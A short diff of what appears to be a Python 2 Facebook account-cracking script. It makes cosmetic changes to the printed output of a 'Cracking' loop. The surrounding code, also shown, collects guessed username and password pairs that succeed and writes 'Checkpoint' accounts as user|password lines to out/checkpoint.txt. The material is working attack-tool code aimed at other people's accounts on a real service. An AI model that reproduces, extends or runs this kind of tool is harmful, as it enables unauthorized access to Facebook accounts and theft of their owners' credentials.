@@ -258,7 +258,7 @@ def pilih_super():
 	jalan('\033[1;96m \033[1;93mStarting \033[1;97m...')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;96m[\033[1;97m✸\033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mCracking \033[1;97m"+o),;sys.stdout.flush();time.sleep(1)
 	print
 	print('\x1b[1;96m \x1b[1;93mTo Stop Process Press CTRL Then Press z')
 	print 42*"\033[1;96m="
@@ -282,7 +282,7 @@ def pilih_super():
 				oks.append(user+pass1)
 			else:
 				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
+					print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m |\x1b[1;97m ' + pass1
 					cek = open("out/checkpoint.txt", "a")
 					cek.write(user+"|"+pass1+"\n")
 					cek.close()
